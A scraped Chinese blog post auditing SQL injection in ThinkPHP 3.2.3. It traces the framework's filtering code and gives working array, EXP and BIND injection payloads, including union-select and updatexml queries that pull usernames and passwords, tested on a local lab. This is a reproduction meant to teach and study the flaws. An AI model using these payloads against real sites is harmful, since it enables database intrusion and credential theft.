{"blogid": "124889749", "writerAge": "码龄2年", "writerBlogNum": "70", "writerCollect": "35", "writerComment": "22", "writerFan": "963", "writerGrade": "4级", "writerIntegral": "833", "writerName": "Sentiment.", "writerProfileAdress": "writer_image\\profile_124889749.jpg", "writerRankTotal": "28534", "writerRankWeekly": "12104", "writerThumb": "78", "writerVisitNum": "74968", "blog_read_count": "1980", "blog_time": "已于 2022-05-26 20:00:51 修改", "blog_title": "Thinkphp3.2.3 SQL注入漏洞", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p><a href=\"https://www.thinkphp.cn/donate/download/id/610.html\">下载：ThinkPHP3.2.3完整版 - ThinkPHP框架</a></p>\n<h1><a id=\"_3\"></a>配置</h1>\n<p><code>ThinkPHP/Conf/convention.php</code>配置下数据库，我这里直接用的sqllabs的数据库</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ffdd353a0b0f4e5a8b6b857fd9b1a996.png\"/></p>\n<p>写个查询入口<code>Application/Home/Controller/IndexController.class.php</code></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">Home<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">Think<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexController</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Controller</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">M</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'users'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'GET.id'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>用的是users表</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\52ff81e52e494be39631dfe9c1f3567f.png\"/></p>\n<p>thinkphp3内置了很多大写函数</p>\n<pre><code class=\"prism language-php\"><span class=\"token constant\">A</span> 快速实例化Action类库\n<span class=\"token constant\">B</span> 执行行为类\n<span class=\"token constant\">C</span> 配置参数存取方法\n<span class=\"token constant\">D</span> 快速实例化Model类库\n<span class=\"token constant\">F</span> 快速简单文本数据存取方法\n<span class=\"token constant\">I</span> 获取系统输⼊变<span class=\"token punctuation\">(</span>与tp5input方法类似<span class=\"token punctuation\">)</span>\n<span class=\"token constant\">L</span> 语言参数存取方法\n<span class=\"token constant\">M</span> 快速高性能实例化模型\n<span class=\"token constant\">R</span> 快速远程调用Action类方法\n<span class=\"token constant\">S</span> 快速缓存存取方法\n<span class=\"token constant\">U</span> <span class=\"token constant\">URL</span>动态生成和重定向方法\n<span class=\"token constant\">W</span> 快速Widget输出方法\n</code></pre>\n<h1><a id=\"_47\"></a>常规注入</h1>\n<p>既然审计SQL注入漏洞了，那常规的注入方式<code>1' or 1=1#</code>肯定是不行的了，但具体为什么不行这里简单的分析下</p>\n<h2><a id=\"int_51\"></a>int型</h2>\n<p>id若是int类型的，会经过<code>intval()</code>处理，最后<code>1' or 1=1#</code>就变成了<code>1</code>，看下大体流程</p>\n<h3><a id=\"I_55\"></a>I方法</h3>\n<p>首先是进入<code>D方法</code>但D方法就是实例化⾃定义模型类，没啥东西，就直接调到<code>I方法</code>了，I方法前边也是一些常规操作，跟一边就能看懂很容易理解,直接看下边的取值部分</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\9f3f7ec2fb27455dbf7d16b059250bd6.png\"/></p>\n<p>经过前边的一系列操作后,<code>$input</code>的值就是我们传入的<code>1' or 1=1#</code>，<code>$name</code>就是id，<code>$filters</code>取得是默认值<code>htmlspecialchars</code>,之后就进入了下边的一些没影响的if判断和操作</p>\n<p>进到这里，判断<code>$data</code>是否为数组(很明显不是)，所以$data的值就是<code>htmlspecialchars(1' or 1=1#)</code>, <code>htmlspecialchars</code>不会处理单引号所以经过此次过滤后，其实$data的值并没变</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\afbafe94169e45a0a9def10c3a0b3f00.png\"/></p>\n<p>最后经过一系列判断<code>retrun $data;</code>了</p>\n<h3><a id=\"find_71\"></a>find方法</h3>\n<p>retrun给了find方法，还是跳过没影响的部分，<code>$options</code>的值就是retrun $data;后来又经过746这行加了个limit</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ba293cffde7049fab104d13743cbad46.png\"/></p>\n<p>直接进入<code>_parseOptions()</code></p>\n<p>前边通过<code>$options['table'] = $this-&gt;getTableName();</code>，获取了表名users，之后就进入了<code>_parseType()</code>方法</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\1b10ebd14f474cfab0d112d5f22afe3a.png\"/></p>\n<p>跟进后先看下执行到683行的值<code>$data[$key]=$data[id]=1' or 1=1#</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\0fdacf7e36784fbd83c96bedd0ba7d3b.png\"/></p>\n<p>之后经过了if判断，由于id定义的是int型，所以这里直接就执行intval了，id的值就变成了1，所以这里无法闭合也就结束了</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\7e4329f23f8c4c0781356c88c280e619.png\"/></p>\n<h2><a id=\"varchar_95\"></a>varchar型</h2>\n<p>int型不行后我又改成了varchar类型(修改时需要关闭AUTO_INCREMENT选项)</p>\n<p>接着上边的分析，在经过<code>_parseType()</code>方法后，下边又执行了<code>select()</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\db79f58fdc974870a123ec5a3030db54.png\"/></p>\n<p>在经过944行的<code>parseBind</code>后，id的值仍为<code>1' or 1=1#</code>，但经过945后，值发生转义了，所以跟进一下<code>buildSelectSql()</code>方法</p>\n<p>跟进<code>parseSql()</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\3d0093b4f21c4d16bc6f3ab6f549a622.png\"/></p>\n<p>我们的值在where里所以直接跟进<code>parseWhere</code>这一条</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\cc01ae0f2130480bb645512e2b9523fa.png\"/></p>\n<p><code>parseWhere</code>中会执行<code>parseWhereItem</code>,之后又会执行<code>parseValue</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\2cfb00ee44194cacb4fa1462a64b99e9.png\"/></p>\n<p>进入第一个if会执行<code> $this-&gt;escapeString($value) : '\\''.$this-&gt;escapeString($value).'\\'';</code></p>\n<p>escapeString对单引号进行转义，所以这里varchar型也就失败了</p>\n<pre><code>public function escapeString($str) {\n    return addslashes($str);\n}\n</code></pre>\n<h1><a id=\"_131\"></a>数组绕过</h1>\n<p>传入<code>?id[where]=1</code></p>\n<p><code>I方法</code>前边都一样，在最后retrun的前一步由于本次传入的是数组，所以进入了<code>think_filter</code>方法</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\4f1d58ff9cad4cc8ba843ea54b8d154d.png\"/></p>\n<p>但其实也没啥东西只对开头部分做检测，根本不需要绕过</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">think_filter</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n   <span class=\"token comment\">// TODO 其他安全过滤</span>\n\n   <span class=\"token comment\">// 过滤查询特殊字符</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$value</span> <span class=\"token operator\">.=</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>之后就还是进入<code>_parseOptions()</code>，再次看<code>_parseType()</code>这部分，注意options的值，前后对比：</p>\n<p>之前：</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\6ca593c346e245a98eb9256d98a44c76.png\"/></p>\n<p>现在：</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\912687e764754c4a83f7500447ce7db6.png\"/></p>\n<p>很明显where不是数组了，所以在经过第一条if检测时就不满足<code>is_array($options['where'])</code>了，所以这里就绕过了<code>_parseType()</code>，从而就绕开了int型中提到的<code>intval</code>转换</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$options</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'where'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$options</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'where'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fields</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$options</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'join'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n</code></pre>\n<p>之后就是解决第二个问题——varchar类型中的<code>escapeString()</code>转义。前边的<code>select()-&gt;buildSelectSql()-&gt;parseSql()</code>就不说了跟之前都一样，直接看<code>parseWhere()</code>这里</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">protected</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">parseWhere</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$where</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$whereStr</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$where</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token comment\">// 直接使用字符串条件</span>\n        <span class=\"token variable\">$whereStr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$where</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span> <span class=\"token comment\">// 使用数组表达式</span>\n</code></pre>\n<p>之前是由于where是数组进入了else再执行一步步操作后，执行到了<code>escapeString()</code>,但这里where变成了字符串所以直接就走if里的语句了，执行后就直接retrun返回了</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ff0a79720c964d0281944ac5784ded99.png\"/></p>\n<p>在执行完<code>parseSql()</code>后，看下returun返回值<code>SELECT * FROM </code>users<code>WHERE 1 LIMIT 1 </code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\933f218d817a4369bd29a7f1cdad3b04.png\"/></p>\n<p>之后就返回到select中被query成功执行了</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\4bc4e98b518a4d2d891a8b9af62a042c.png\"/></p>\n<p>payload</p>\n<pre><code>?id[where]=0 union select 1,group_concat(username,0x2a,password),3 from users#\n?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)#\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\317cd3ae367a446dbf411518133d65cc.png\"/></p>\n<h1><a id=\"EXP_207\"></a>EXP注入</h1>\n<p>改下controller</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">Home<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">Think<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexController</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Controller</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$User</span> <span class=\"token operator\">=</span> <span class=\"token function\">D</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Users'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$map</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'username'</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// $map = array('username' =&gt; I('username'));</span>\n        <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$User</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">where</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$map</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>先贴payload：</p>\n<pre><code>?username[0]=exp&amp;username[1]==-1 union select 1,2,3\n</code></pre>\n<p>exp注入这里用到的是where、而之前数组注入时用的是<code>I方法</code>,原因在于若执行<code>I方法</code>,会执行到<code>think_filter</code>对exp开头的数据进行过滤，而从payload也可以看出这里是以exp开头的，所以这里选用了<code>where</code>方法</p>\n<p>先看<code>where方法</code>,这里直接跳到最后(因为前边的if判断都没有执行)，这里通过值也能看出，其实就是我们GET传参的内容</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\beffd30c17004466a3662e7f21b6f571.png\"/></p>\n<p>之后的操作就一样了，到<code>find()</code>方法，执行<code>_parseOptions()</code>，然后就到了下边这里，通过foreach将$options[‘where’]的值给<code>$val</code>再通过<code>is_scalar($val)</code>进行标量 <code>(integer、float、string 或 boolean)</code> 判断，很明显$val是数组不是标量,所以直接绕过了<code>_parseType()</code>,也就绕开了<code>intval</code>转换</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\d02897b5a13643d2a577b31f8d66274b.png\"/></p>\n<p>之后又一样了，<code>select()-&gt;buildSelectSql()-&gt;parseSql()-&gt;parseWhere()</code>，再执行<code>parseWhereItem()</code>，正则部分为false，所以直接跳到了下方的elseif，对$whereStr赋值，此时$key=username $var[1]=“=-1 union select 1,2,3”，所以最终的$whereStr=username=-1 union select 1,2,3</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\fe593fe7edd54edd9e7b574301804050.png\"/></p>\n<p>最终就是return 一步步返回 成功执行sql语句</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\313e6c05e4ec484580e2a7d2708dac19.png\"/></p>\n<pre><code class=\"prism language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>users<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">WHERE</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>username<span class=\"token punctuation\">`</span></span> <span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token keyword\">LIMIT</span> <span class=\"token number\">1</span>  \n</code></pre>\n<p>payload</p>\n<pre><code>http://127.0.0.1/thinkphp/tp3.2.3/?username[0]=exp&amp;username[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)\n</code></pre>\n<h1><a id=\"BIND_265\"></a>BIND注入</h1>\n<p>还是先写controller</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">namespace</span> <span class=\"token package\">Home<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token package\">Think<span class=\"token punctuation\">\\</span>Controller</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">IndexController</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Controller</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$User</span> <span class=\"token operator\">=</span> <span class=\"token function\">M</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Users\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$user</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">I</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$value</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$User</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">where</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>先执行<code>where()</code>，跟之前一样</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\a0880857f1ff40c99b1bff79eea28fcd.png\"/></p>\n<p>之后就是<code>save()</code>方法，416又看到了我们熟悉的方法<code>_parseOptions</code>,还是跟之前一样将<code>$options</code>和<code>$this-&gt;$options</code>合并给<code>$options</code>这里就不看了</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\ab2395888c3b4deb930c8ad2f68d59c8.png\"/></p>\n<p>继续向下执行进入451行的<code>update()</code>方法，主要是这几个方法一个个看一下。</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\cbacda9732df4ab19dc24e4cc11d40d9.png\"/></p>\n<p>跟进<code>parseSet()</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\3daf9cbf94c6430e9af33ebb3ac08ba5.png\"/></p>\n<p>跟进<code>bindParam()</code>,<code>$value</code>就是之前传入的<code>$password</code>的值——<code>1</code>,执行结束后<code>bind[:0]=1</code></p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">protected</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">bindParam</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">bind</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">':'</span><span class=\"token operator\">.</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">]</span>  <span class=\"token operator\">=</span>   <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>再跟进<code>parseWhere()-&gt;parseWhereItem()</code>，这里跟exp注入是一样的，主要区别在于elseif这里，之前<code>$exp=exp</code>,这里<code>$exp=bind</code>,最后拼接后的<code>$whereStr</code>值在下边</p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\d463c2e003c64cf7a5debe642d09a8aa.png\"/></p>\n<p>结束后进入<code>execute</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\cf1da231b0a14c1ea09ef532adda5da6.png\"/></p>\n<p>先看①处的闭包</p>\n<p><strong>array_map</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">add2</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$value</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$arr</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span>add2<span class=\"token punctuation\">,</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>结果</p>\n<pre><code class=\"prism language-php\"><span class=\"token keyword\">Array</span>\n<span class=\"token punctuation\">(</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">3</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">4</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">5</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">6</span>\n    <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=&gt;</span> <span class=\"token number\">7</span>\n<span class=\"token punctuation\">)</span>\n</code></pre>\n<p>所以这里就是对<code>$this-&gt;bind()</code>执行闭包中的操作，bind的值为1，所以就相当于$val=1执行了<code>function($val) use(\\$that){ return '\\''.$that-&gt;escapeString($val).'\\''; }</code>,而<code>1</code>执行<code>escapeString()</code>后，返回结果还是<code>1</code>最后再加上前后的单引号就变成了 ‘1’</p>\n<p>即<code>bind[:0]=1</code>变为<code>bind[:0]='1'</code></p>\n<p><strong>strtr</strong></p>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\8dd1aec480f84f34a5bbf4f0a81d243d.png\"/></p>\n<p>所以源代码中的strtr部分经过<code>array_map</code>,就可以理解为这种形式</p>\n<pre><code class=\"prism language-php\"><span class=\"token function\">strtr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">queryStr</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\":0\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>执行后将<code>$this-&gt;queryStr</code>中的<code>:0</code>替换成了<code>1</code>，这也就是payload中是0而不是其它值的原因</p>\n<p>替换后的<code>$this-&gt;queryStr</code></p>\n<pre><code>UPDATE `users` SET `password`='1' WHERE `id` = '1' and updatexml(1,concat(0x7e,user(),0x7e),1)\n</code></pre>\n<p>最后就成功执行了</p>\n<h1><a id=\"_377\"></a>总结</h1>\n<p>看似三个链子很长，其实都是常规注入流程的一种bypass扩展，并且在代码上经过调试也能慢慢理解，tp小白不足之处敬请师傅指点。</p>\n<p><a href=\"https://blog.csdn.net/rfrder/article/details/114024426\">thinkphp3.2.3 SQL注入漏洞复现_bfengj的博客-CSDN博客_thinkphp3.2.3漏洞利用工具</a></p>\n<p><a href=\"https://www.cnblogs.com/kenshinobiy/p/9165662.html\">ThinkPHP中的常用方法汇总总结:M方法，D方法，U方法，I方法 - 谦信君 - 博客园 (cnblogs.com)</a></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}